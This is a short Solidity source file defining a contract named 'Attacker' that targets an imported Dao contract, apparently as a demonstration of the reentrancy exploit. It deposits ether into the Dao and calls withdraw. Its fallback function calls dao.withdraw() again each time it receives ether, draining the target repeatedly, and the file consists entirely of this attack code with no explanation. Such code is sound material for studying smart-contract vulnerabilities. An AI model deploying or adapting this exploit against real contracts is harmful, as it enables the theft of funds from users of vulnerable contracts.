pragma solidity ^0.4.11;

import './Dao.sol';

contract Attacker {

	uint public counter = 0;
	Dao dao;

	event logDeposit(address _address, uint _value);

	function Attacker(address _daoAddress) {
		dao = Dao(_daoAddress);
	}

	function deposit() payable {
		logDeposit(msg.sender, msg.value);
		dao.deposit.value(msg.value)();
	}

	function withdraw() {
		dao.withdraw();
	}

	function getBalance() returns(uint) {
		return this.balance;
	}

	function() payable {
		counter++;
		dao.withdraw();
	}

}
